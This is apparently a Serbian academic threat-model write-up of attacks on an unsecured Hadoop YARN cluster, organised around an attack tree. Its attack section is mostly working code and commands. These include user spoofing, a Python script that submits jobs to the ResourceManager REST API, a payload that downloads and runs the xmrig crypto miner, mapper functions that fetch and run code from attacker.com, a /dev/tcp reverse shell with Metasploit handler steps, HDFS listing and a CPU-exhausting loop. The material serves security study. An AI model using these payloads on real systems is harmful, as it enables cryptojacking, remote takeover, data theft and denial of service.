<a id="referentna_arhitektura"></a>
# Referentna arhitektura
Ovo je referentni nezaštićeni _Hadoop_ klaster koji je postavljen od strane osobe sa osnovnim znanjima po pitanju bezbednosti. Dijagram se dirketno oslanja na prethodno razrađene dijagrame tokova podataka, s tim da je ovde fokus na čvorovima klastera. Potrebno je uvesti određenu referentnu arhitekturu kako bi se na lakši način ispratile analize, napadi i mitigacije u odnosu na posmatrane pretnje. Konkretan čvor može predstavljati zaseban server, pri čemu svi čvorovi klastera međusobno komuniciraju. Pretpostavka je da su svi čvorovi pokrenuti na operativnom sistemom _Linux_ distribucije , jer se zbog prilagođenosti i podrške takav izbor dominantno sreće u praksi [[2]](#[2]). Kod nezaštićenog klastera korisnik može komunicirati sa svim čvorovima, bilo kroz nezaštićene javne servise ili direktno putem terminal sesije odnosno _SSH_ sesije u kombinaciji sa _Hadoop_ klijent interfejsom. S obzirom da je reč o distribuiranom sistemu, konfiguracije kao i korisnici su redudantno prisutni na svim čvorovima. [[3]](#[3]) Od korisnika, za sada, je potrebno istaći _hdfs_ i _yarn_ koji su ekvivalent _root_ korisniku u _Hadoop_ modulu.

![Referentna arhitektura](./Referentna_arhitektura.svg)

_Slika 1: Komunikacija korisnika sa Hadoop klasterom_

Za referentni klaster uzima se osnovni model bez primene naprednih bezbednosnih mehanizama. Podrazumeva se korišćenje standardno definisane kontrole pristupa _Hadoop_ klastera, pri čemu korisnik ili dobija potpun pristup klasteru ili ga nema uopšte [[4]](#[4]). Na taj način kontrola pristupa se praktično svodi na nivo čvora koji učestvuje u klasteru. Ovakav pristup nije neuobičajen, već se često sreće u praksi, s obzirom na to da se klasteri najčešće podižu u tzv. "bezbednim okruženjima" [[5]](#[5]).

# Stablo napada
Sledeće stablo napada oslikava analizu pretnje visokog nivoa _Manipulacija poslovima (P41)_, koja je prepoznata egzistencijom kritičnog resursa _Poslovi i zadaci (R4)_. 
<a id="slika_2"></a>

![Stablo napada](./Stablo_napada.svg)

_Slika 2: Stablo napada razvijeno u odnosu na pretnju visokog nivoa Manipulacija poslovima (P41)_

Par napomena koje su uvedene radi preglednosti dijagrama:
* Pretnje su povezane samo sa bezbednosnim kontrolama koje predstavljaju dovoljan uslov za njihovu efikasnu zaštitu.
* Keberos kao bezbednosna kontrola se praktično kod svih napada preporučuje, pa je izostavljena. Smatra se da automatski podrazumeva i autorizaciju, ne samo autentifikaciju.
* Trivijalne bezbednosne kontrole, poput ažuriranja verzija zavisnosti, se podrazumevaju. 


U nastavku su predstavljeni odabrani napadi. Oni su definisani tako da što jasnije grupišu klase napada. U skladu sa procenjenim rizikom, izdvojeni napadi predstavljaju najučestalije realizacije pretnji u kontekstu poslova na nivou _YARN_ komponente [[6]](#[6]).

<a id="A4111"></a>
# A4111. Napad na ranjive pristupne tačke _YARN_ komponente

Ovaj napad se pre svega ogleda u načinu funkcionisanja _YARN_ komponentne. Glavni cilj _YARN_ komponente je omogućiti distribuirano procesuiranje najrazličitijih tipova aplikacija bez potrebe za dubljim znanjima. Dakle, isporučiti aplikaciju kroz zahtev i dobiti rezultate procesuiranja. Pošto je moguće uputiti javni zahev za aplikacijom proizvoljnog tipa, a _Hadoop_ klasteri obiluju resursima, to malicioznim korisnicima privlači pažnju.  

Suština napada je plasiranje _malware_ aplikacija kroz eksploataciju ranjivosti pristupnih tačaka.

U _YARN_ komponenti pristupne tačke mogu biti:
1. Pristup putem sesije u terminalu.
2. Pristup putem javno dostupnih _REST API_ servisa.
3. Pristup putem _Web UI_ servisa (nerelevantan, jer ne omogućava kreiranje aplikacija).

Reč je o istoj klasi napada, bez obzira na tip pristupne tačke. Zastupljenost napada je veća kod _REST API_ servisa jer je i površina za napad veća. 

__Sesija u terminalu__

U ovom slučaju reč je o manje verovatnom obliku napada, jer je napadač osoba koja je najčešće prethodno ovlašćena za upotrebu servisa. Ipak, bez obzira, dokle god su pristupne tačke ranjive, moguće je izvršiti napad. 

__REST API servis__

_YARN_ komponenta je javno dostupna preko _ResourceManager_ čvora. Zbog nedostatka autentifikacije napad je moguć čak i uz omogućenu autorizaciju. Da bi se napad sprečio potrebno je implementirati napredne bezbednosne mehanizme.

__Problematika autentifikacije__

S obzirom da _Hadoop_ modul nema internu podršku autentifikaciji, već samo autorizaciji, napadač se vrlo lako može lažno predstaviti. 
Ako _Hadoop_ modul nema javno dostupne pristupne tačke, tada se razmatra slučaj lokalnih korisnika na operativnim sistemima. Lokalni korisnik se prijavljuje na konkretan čvor sa svojim kredencijalima. _Hadoop_ modul će u promenljivu `HADOOP_USER_NAME` smestiti korisničko ime ulogovanog korisnika. Korisnik na trivijalan način može izmeniti promenljivu na vrednost `hdfs`, `yarn` ili bilo čije korisničko ime (npr. `alice`). 
``` sh
export HADOOP_USER_NAME=alice
hadoop fs -ls /data/financial_data
```
Za slučaj kada _Hadoop_ modul ima javno dostupne pristupne tačke, dovoljno je proslediti proizvoljnu vrednost korisničkog imena (npr. `admin`) kao upitni parametar _HTTP_ zahteva. 
``` sh
curl -X POST http://resource-manager:8088/ws/v1/cluster/apps/new-application?user.name=admin
```
Zaključuje se da je nepostojećom autentifikacijom obesmišljena autorizacija.

__Sinergija faktora__

Sledeći faktori sinergetski utiču na pojavu ovog napada:
- Istorijski bezbednost nije bila fokus _Hadoop_ modula. Podrazumevalo se bezbedno okruženje.
- Podrazumevani režim _Hadoop_ modula (_Simple Authentication_) je nebezbedan.
- _YARN REST API_ i _Web UI_ servisi su podrazumevano javno dostupni.
- _Hadoop_ modul favorizuje _usability_.
- Izuzetna kompleksnost implementacija komponente za autentifikaciju - _Kerberos_ [[7]](#[7])[[8]](#[8]).
- Korisnik se može lažno predstaviti (_spoofing_).
- Ako nema autentifikacije tada nema ni autorizacije.
- Aplikacije mogu biti različitog tipa. Teško utvrditi semantiku.
- Aplikacije (kontejneri) se pokreću od strane _yarn_ korisnika.
- Dopušten izlazni saobraćaj prema bilo kome.
- Praktično direktno obraćanje čvorovima.
- Angažovanje nestručnog osoblja (junior administrator).
- Nije potrebno naročito tehničko znanje (mnoštvo napadača).
- Velika površina za napad.

To su ključni razlozi zašto _YARN_ pristupne tačke, pre svega javno dostupne, postaju tako lako ranjive, i zašto ovaj napad predstavlja izbor broj jedan u _Hadoop_ klasterima. Stoga je reč o trivijalnoj, ali kritičnoj ranjivosti.

__Zanimljivosti__

Ako se razmatra napad na javno dostupne pristupne tačke, sa pretpostavljenim [klasterom](referentna_arhitektura), onda se mogu pronaći sledeće zanimljivosti. Poznato je da je u pitanju najzastupljenija klasa napada u _Hadoop_ klasterima, pri čemu se svakog momenta izvrši 300 000 pokušaja realizacije. Svi javno dostupni _Hadoop_ klasteri bivaju aktivno traženi od strane specijalizovanih pretraživača kao što su _Shodan_ ili _Fofa_ [[6]](#[6]). Pitanje je vremena kada će biti pronađeni i napadnuti.

Kao što se može primetiti pregledom stabla napada na [slici 2](#slika_2), realizacijom ovog napada ostvaruje se događaj pokretanje maliciozne aplikacije. Cilj napadača će biti predodređen tipom maliciozne aplikacije. U praksi se najčešće sreću _botnet_, _crypto mining_ i _ransomware_ aplikacije, pri čemu gotovo uvek dolazi i do krađe podataka [[9]](#[9]). Da bi opis ove klase napada bio zanimljiviji i realističniji, fokus će biti na pokretanju _crypto mining_ aplikacije. Uz napomenu da je krađa podataka daleko najozbiljnija pretnja po jedan _Hadoop_ klaster, a osnovni cilj napadača često se širi, obuhvatajući sve kritične resurse i servise kojima ima pristup, uz mogućnost pivotiranja [[10]](#[10])[[11]](#[11]). Pokretanje malicioznih aplikacija je kritična pretnja kojom se u zavisnosti od tipa aplikacije može narušiti bilo koje bezbednosno svojstvo resursa ili servisa. Rizik za realizacijom ove pretnje je kritičan s obzirom na visok negativan uticaj pretnje i visoku verovatnoću izvršavanja.


## Realizacija napada
Osnovni _payload_ predstavlja `.py` skripta, pomoću koje je moguće realizovati napad [[12]](#[12]). 
Od parametara je potrebno uneti:
- `scheme`, _URL_ šemu _REST API_ servisa.
- `target`, adresu _REST API_ servisa.
- `port`, port _REST API_ servisa.
- `attacker_address`, adresu napadača.
- `attacker_port`, port adrese na kom napadač sluša.

Trenutno je reč o direktnom obraćanju _ResourceManager_ čvoru.
``` python
import requests

scheme = 'http' 
target = 'resource-manager'
port = '8088'
base_url = f"{scheme}://{target}:{port}/ws/v1/cluster/apps/" 
url = base_url + "new-application"
resp = requests.post(url)
app_id = resp.json()['application-id']
url = base_url
attacker_address = '192.168.1.5'
attacker_port = '9999'

data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': 'malicious command',
        },
    },
    'application-type': 'YARN', 
}

requests.post(url, json=data)
```

### _Crypto mining_ aplikacija
Obaviće se simulacija napada tako što će se pokrenuti lokalni server koji će skladištiti potrebne fajlove kripto majnera. Zatim će se se izvršiti maliciozni posao čiji opis predstavlja preuzimanje i pokretanje kripto majnera.

Pokrenuti lokalni server:
``` sh
python -m http.server 15066
```

Potrebno je preuzeti neki od _light_ kripto majnera i iskonfigurisati ga u zavisnosti od motivacije i ciljne platforme [[13]](#[13])[[14]](#[14]). Dostupni su kripto majneri sa vrlo širokim skupom podešavanja, poput postavljanja višestrukih kripto adresa, pokretanja u _IDLE_ režimu, rudarenja u određenim vremenskim trenucima, dinamičkog nivoa opterećenja resursa i tako dalje. Fokus je na kripto majnerima koji eksploatišu centralni procesor, budući da grafički procesori obično nisu prisutni na _Hadoop_ serverima. Najčešće izabrana kripto valuta je _Monero_, pošto se pokreće na centralnom procesru i nudi visok nivo anonimnosti. 


Ažurirati _payload_ za preuzimanje i pokretanje kripto majnera [[15]](#[15])[[16]](#[16]). 
```python
"command": f"curl -o xmrig http://{attacker_address}:{attacker_port}/xmrig && "  
           f"curl -o config.json http://{attacker_address}:{attacker_port}/config.json && "
           "chmod +x xmrig && " 
           "./xmrig"
```
Dakle, izvršiće se preuzimanje samog binarnog fajla kripto majnera, kao i konfiguracionog fajla sa željenim postavkama. Zatim će se dodeliti privilegije izvršavanja binarnom fajlu. Nakon čega će se izvršiti pokretanje i brisanje binarnog i konfiguracionog fajla kako bi se prikrili tragovi.

Čitav _NodeManager_ čvor, unutar kog je pokrenut _ApplicationMaster_ kontejner, je opterećen na 100%, čime se postiže praktična neupotrebljivost čvora klastera zaduženog za obradu poslova.

![Napad A4111 crypto mining aplikacija](./Napad_A4111_crypto_mining_aplikacija.png)
_Slika 3: Rezultat pokretanja crypto mining posla_

![CPU opterećenje _NodeManager_ čvora](./NM_CPU_opterecenje.png)

_Slika 4: CPU opterećenje _NodeManager_ čvora uzrokovanom pokretanjem crypto mining posla_


Ako je napadač zaposleni, tada on poseduje terminal sesiju nad _ResourceManager_ čvorom i može definisati malicioznu _mapper_ funkciju. Sledeće varijante zaobilaze korišćenje _YARN REST API_ servisa. 

Primer _mapper_ funkcije napisane u _Python_ programskom jeziku:
``` py
def mapper:
  os.system("wget http://attacker.com/malware.py -O /tmp/malware.py && python /tmp/malware.py")
```
Primer _mapper_ funkcije napisane u _Java_ programskom jeziku:
``` java
public class Mapper extends Mapper<LongWritable, Text, Text, IntWritable> {
  @Override
  protected void map(LongWritable key, Text value, Context context) {
    Runtime.getRuntime().exec("curl http://attacker.com/malware.sh | sh");
  }
}
```
U kasnijim primerima će biti prikazane komande kojima se pokreću poslovi na različite načine.

### _Reverse shell_ aplikacija

U ovom slučaju prikazaće se pokretanje malicioznog posla čiji opis predstavlja _reverse shell_ komandu uz kasniju eskalaciju napada. Za  uspostavljanje _reverse shell_ sesije korišćen je alat _msfconsole_.

Za početak, sledi proces otvaranja porta na _Windows_ mašini. Pokrenuti _metaspolit_ u _command prompt_ sesiji:
``` sh
msfconsole
```
Odabrati eksploit za otvaranje porta:
``` sh
use exploit/multi/handler
```
Odabrati _payload_:
``` sh
set payload cmd/unix/reverse_bash
```
Postaviti adresu napadača
``` sh
set LHOST 192.168.1.5
```
Odabrati port koji će biti u režimu slušanja:
``` sh
set LPORT 9999
```
Ostaviti sesiju nakon što postane aktivna:
``` sh
set ExitOnSession false
```
Započeti proces slušanja:
``` sh
exploit -j
```

Nakon što je port otvoren, potrebno je pokrenuti podrazumevani eksploit uz manje modifikacije. 
```python
'command': f"/bin/bash -i >& /dev/tcp/%s/{attacker_port} 0>&1' % {attacker_address}",
```

Sada je potrebno vratiti se na _command prompt_ sesiju kako bi se otvorila _reverse shell_ sesija u okviru _ApplicationMaster_ kontejnera. 

Pregledati sve sesije:
``` sh
sessions
```
Zatim izabrati sesiju koja je uspostavljenja:
``` sh
sessions -i <session_id>
```
Moguće je proveriti pod kojim korisnikom se izvršava sesija, i odgovor kod referentnog klastera bi bio _yarn_.
``` sh
whoami # yarn
```
![Napad A4111 reverse shell aplikacija](./Napad_A4111_reverse_shell_aplikacija.png)

_Slika 5: Rezultat pokretanja reverse shell posla_

Kao što je navedeno pri analizi, često sledi dalja eskalacija napada u vidu sabotaže _firewall_ postavki, ispitivanje komponenti sistema radi mogućeg širenja (pivotiranje).
Iz pozicije _yarn_ korisnika u _ApplicationMaster_ kontejneru, vrlo je lako dobiti pristup svim blokovima podataka. Takođe je moguće pokrenuti i bilo kakvu aplikaciju uz neograničene resurse. Radi demonstracije opisanog slede dva mini primera eskalacije.

__Čitanje blokova podataka__

Postaviti promenljivu okruženja na direktorijum u kojem je instaliran _Hadoop_:
``` sh
export HADOOP_HOME=/opt/hadoop-3.2.1
```
Dodati `bin` direktorijum iz _Hadoop_ instalacije u promenljivu `PATH`, kako bi _Hadoop_ komande bile dostupne iz bilo kog direktorijuma:
``` sh
export PATH=$HADOOP_HOME/bin:$PATH
```
Sada su dostupne komande za pregled svih podataka skladištenih u distribuiranom fajl sistemu (blokovi podataka):
``` sh
hdfs dfs -ls /
```
__Izazivanje nedostupnosti klastera__

Pokrenuti beskonačnu petlju:
``` sh
nohup sh -c "while true; do :; done" &
```

# Reference

<a id="[1]"></a>
[1] [Korišćena terminologija u ovom istraživačkom radu](https://github.com/Luburic/zoss-model-pretnji/blob/main/modeli/terminologija.md) _(Autor: Nikola Luburić, Pristupano: _13. decembra, 2024_)_

<a id="[2]"></a>
[2] [Which is the best operating system to run Hadoop?](https://www.researchgate.net/post/Which_is_the_best_operating_system_to_run_Hadoop) _(Autor: Dhananjaya Gm, Pristupano: _25. juna, 2025_)_

<a id="[3]"></a>
[3] [Hadoop Security: Protecting your big data platform - Provisioning of Hadoop Users](https://www.oreilly.com/library/view/hadoop-security/9781491900970/) _(Autor: Ben Spivey, Joey Echeverria, Izdato: _01. jula, 2015_)_

<a id="[4]"></a>
[4] [Hadoop Security: Protecting your big data platform - Knjiga: Why Kerberos?](https://www.oreilly.com/library/view/hadoop-security/9781491900970/) _(Autor: Ben Spivey, Joey Echeverria, Izdato: _01. jula, 2015_)_

<a id="[5]"></a>
[5] [Hadoop Security: Protecting your big data platform - Hadoop Security: A Brief History](https://www.oreilly.com/library/view/hadoop-security/9781491900970/) _(Autor: Ben Spivey, Joey Echeverria, Izdato: _01. jula, 2015_)_

<a id="[6]"></a>
[6] [Hadoop YARN: An Assessment of the Attack Surface and Its Exploits](https://www.radware.com/blog/security/hadoop-yarn-an-assessment-of-the-attack-surface-and-its-exploits/) _(Autor: Pascal Geenens, Pristupano: _1. jula, 2025_)_

<a id="[7]"></a>
[7] [What are the challenges of using Kerberos for Big Data applications?](https://www.linkedin.com/advice/1/what-benefits-challenges-using-kerberos-securing-big-data) _(Autor: Ujjwal Sontakke Jain, Pristupano: _25. jula, 2025_)_

<a id="[8]"></a>
[8] [Taming the Three-headed Beast: Understanding Kerberos for Trouble-shooting Hadoop Security](https://medium.com/@blackvvine/taming-the-three-headed-beast-understanding-kerberos-for-trouble-shooting-hadoop-security-12f6c152fe97) _(Autor: Iman Akbari, Pristupano: _25. jula, 2025_)_

<a id="[9]"></a>
[9] [Apache Applications Targeted by Stealthy Attacker](https://www.aquasec.com/blog/threat-alert-apache-applications-targeted-by-stealthy-attacker/) _(Autor: Nitzan Yaakov, Asaf Eitani, Pristupano: _25. jula, 2025_)_

<a id="[10]"></a>
[10] [Threat Actors Exploit Misconfigured Apache Hadoop YARN](https://www.trendmicro.com/en_fi/research/21/g/threat-actors-exploit-misconfigured-apache-hadoop-yarn.html) _(Autor: Alfredo Oliveira, David Fiser, Pristupano: _25. jula, 2025_)_

<a id="[11]"></a>
[11] [Pivot](https://csrc.nist.gov/glossary/term/pivot) _(Autor: National Institute of Standards and Technology, Pristupano: _25. jula, 2025_)_

<a id="[12]"></a>
[12] [Hadoop YARN ResourceManager Unauthorized Access](https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn) _(Autor: Owen Gong, Pristupano: _3. avgusta, 2025_)_

<a id="[13]"></a>
[13] [SilentXMRMiner v1.5.1 - Based on Lime Miner v0.3](https://github.com/UnamSanctam/SilentXMRMiner?tab=readme-ov-file) _(Autor: Unam Sanctam i saradnici, Pristupano: _3. avgusta, 2025_)_

<a id="[14]"></a>
[14] [XMRig](https://github.com/xmrig/xmrig) _(Autor: XMRig, Pristupano: _3. avgusta, 2025_)_

<a id="[15]"></a>
[15] [Lucifer DDoS botnet Malware is Targeting Apache Big-Data Stack](https://www.aquasec.com/blog/lucifer-ddos-botnet-malware-is-targeting-apache-big-data-stack/) _(Autor: Nitzan Yaakov, Pristupano: _3. avgusta, 2025_)_

<a id="[16]"></a>
[16] [Hadoop RPC Unauthorized](https://github.com/WHIJK/hadoop-rpc-unauthorized/blob/main/src/main/java/client/exp.java) _(Autor: WHIJK, Pristupano: _3. avgusta, 2025_)_

